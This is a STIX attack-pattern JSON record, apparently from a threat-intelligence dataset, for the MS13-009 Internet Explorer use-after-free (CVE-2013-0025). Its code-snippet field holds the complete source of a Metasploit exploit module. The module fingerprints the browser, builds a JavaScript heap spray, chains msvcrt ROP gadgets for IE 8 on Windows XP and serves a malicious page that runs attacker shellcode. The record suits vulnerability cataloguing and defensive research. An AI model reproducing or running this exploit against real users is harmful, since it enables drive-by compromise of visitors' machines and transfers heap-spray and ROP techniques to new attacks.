{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7fe13285-1bde-412a-8f86-4921948c37e0",
    "created": "2024-08-14T16:42:01.204502Z",
    "modified": "2024-08-14T16:42:01.204507Z",
    "name": "\"MS13-009 Microsoft Internet Explorer SLayoutRun Use-After-Free\"",
    "description": " This module exploits a use-after-free vulnerability in Microsoft Internet Explorer where a CParaElement node is released but a reference is still kept in CDoc. This memory is reused when a CDoc relayout is performed.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms13_009_ie_slayoutrun_uaf.rb",
            "external_id": "ms13_009_ie_slayoutrun_uaf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0025"
        },
        {
            "source_name": "reference",
            "url": "http://security-assessment.com/files/documents/advisory/ie_slayoutrun_uaf.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS13-009 Microsoft Internet Explorer SLayoutRun Use-After-Free\",\n      'Description'    => %q{\n        This module exploits a use-after-free vulnerability in Microsoft Internet Explorer\n        where a CParaElement node is released but a reference is still kept\n        in CDoc. This memory is reused when a CDoc relayout is performed.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Scott Bell <scott.bell[at]security-assessment.com>' # Vulnerability discovery & Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-0025' ],\n          [ 'OSVDB', '90122' ],\n          [ 'MSB', 'MS13-009' ],\n          [ 'URL', 'http://security-assessment.com/files/documents/advisory/ie_slayoutrun_uaf.pdf' ]\n        ],\n      'Payload'\t  =>\n        {\n          'BadChars'       => \"\\x00\",\n          'Space'          => 920,\n          'DisableNops'    => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'\t  => 'win',\n      'Targets'\t  =>\n        [\n          [ 'Automatic', {} ],\n          [ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => 0x5f4 } ]\n        ],\n      'Privileged'\t  => false,\n      'DisclosureDate'  => '2013-02-13',\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n    ie = agent.scan(/MSIE (\\d)/).flatten[0] || ''\n\n    ie_name = \"IE #{ie}\"\n\n    case nt\n    when '5.1'\n      os_name = 'Windows XP SP3'\n    end\n\n    targets.each do |t|\n      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))\n        print_status(\"Target selected as: #{t.name}\")\n        return t\n      end\n    end\n\n    return nil\n  end\n\n  def heap_spray(my_target, p)\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    js = %Q|\n\n      var heap_obj = new heapLib.ie(0x20000);\n      var code = unescape(\"#{js_code}\");\n      var #{randnop} = \"#{js_nops}\";\n      var nops = unescape(#{randnop});\n      while (nops.length < 0x80000) nops += nops;\n      var offset = nops.substring(0, #{my_target['Offset']});\n      var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n      while (shellcode.length < 0x40000) shellcode += shellcode;\n      var block = shellcode.substring(0, (0x80000-6)/2);\n      heap_obj.gc();\n      for (var i=1; i < 0x300; i++) {\n        heap_obj.alloc(block);\n      }\n    |\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n\n    end\n\n    return js\n  end\n\n  def get_payload(t, cli)\n    code = payload.encoded\n\n    # No rop. Just return the payload.\n    return code if t['Rop'].nil?\n\n    # ROP chain generated by mona.py - See corelan.be\n    case t['Rop']\n    when :msvcrt\n      print_status(\"Using msvcrt ROP\")\n      rop_nops = [0x77c39f92].pack(\"V\") * 11 # RETN\n      rop_payload = generate_rop_payload('msvcrt', \"\", {'target'=>'xp'})\n      rop_payload << rop_nops\n      rop_payload << [0x77c364d5].pack(\"V\") # POP EBP # RETN\n      rop_payload << [0x77c15ed5].pack(\"V\") # XCHG EAX, ESP # RETN\n      rop_payload << [0x77c35459].pack(\"V\") # PUSH ESP # RETN\n      rop_payload << [0x77c39f92].pack(\"V\") # RETN\n      rop_payload << [0x0c0c0c8c].pack(\"V\") # Shellcode offset\n      rop_payload << code\n    end\n\n    return rop_payload\n  end\n\n  def get_exploit(my_target, cli)\n    p  = get_payload(my_target, cli)\n    js = heap_spray(my_target, p)\n\n    html = %Q|\n    <!doctype html>\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    <script>\n    var data;\n    var objArray = new Array(1150);\n\n    setTimeout(function(){\n      document.body.style.whiteSpace = \"pre-line\";\n\n      CollectGarbage();\n\n      for (var i=0;i<1150;i++){\n        objArray[i] = document.createElement('div');\n        objArray[i].className = data += unescape(\"%u0c0c%u0c0c\");\n      }\n\n      setTimeout(function(){document.body.innerHTML = \"boo\"}, 100)\n    }, 100)\n\n    </script>\n    </head>\n    <body>\n    <p> </p>\n    </body>\n    </html>\n    |\n\n    return html\n  end\n\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    uri   = request.uri\n    print_status(\"Requesting: #{uri}\")\n\n    my_target = get_target(agent)\n    # Avoid the attack if no suitable target found\n    if my_target.nil?\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    html = get_exploit(my_target, cli)\n    html = html.gsub(/^ {4}/, '')\n    print_status \"Sending HTML...\"\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2013-02-13",
    "x_mitre_platforms": [
        "win'"
    ]
}